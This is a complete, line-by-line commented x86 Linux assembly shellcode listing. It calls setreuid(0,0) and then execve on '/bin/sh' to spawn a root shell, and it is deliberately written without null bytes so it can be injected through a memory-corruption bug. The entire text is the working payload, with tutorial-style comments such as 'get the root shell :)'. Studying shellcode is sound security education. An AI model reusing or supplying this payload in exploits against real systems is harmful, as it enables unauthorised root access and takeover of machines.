section .text       ; start the code section of the asm
global _start       ; declare a global label

_start:             ; label to indicate start of code
; setreuid (0,0)    ; get full priveledges
xor eax, eax        ; clear our the eax register
mov al, 0x46        ; set the syscall # to hex 46, one byte
xor ebx, ebx        ; clear the ebx register
xor ecx, ecx        ; clear the ecx register
int 0x80            ; call the kernel to get root priveledges

; Now spawn shellcode with execve
xor eax, eax        ; clear the eax register
push eax            ; push a NULL on to the stack, needed to term the string
push 0x68732f2f     ; bytes for '//sh/' onto the stack, with leading '/'
push 0x6e69622f     ; bytes for /bin, strings are in reverse on stack
mov ebx, esp        ; move the stack pointer onto the ebx register
push eax            ; eax is NULL, terminate the char ** argv on stack with it
push ebx            ; pointer to the address of '/bin/sh', use ebx
mov ecx, esp        ; esp now holds the address of argv, save it in ecx
xor edx, edx        ; set edx to NULL
mov al, 0xb         ; set the syscall # to hex b, one byte so as not to have a NULL
int 0x80            ; get the root shell :)
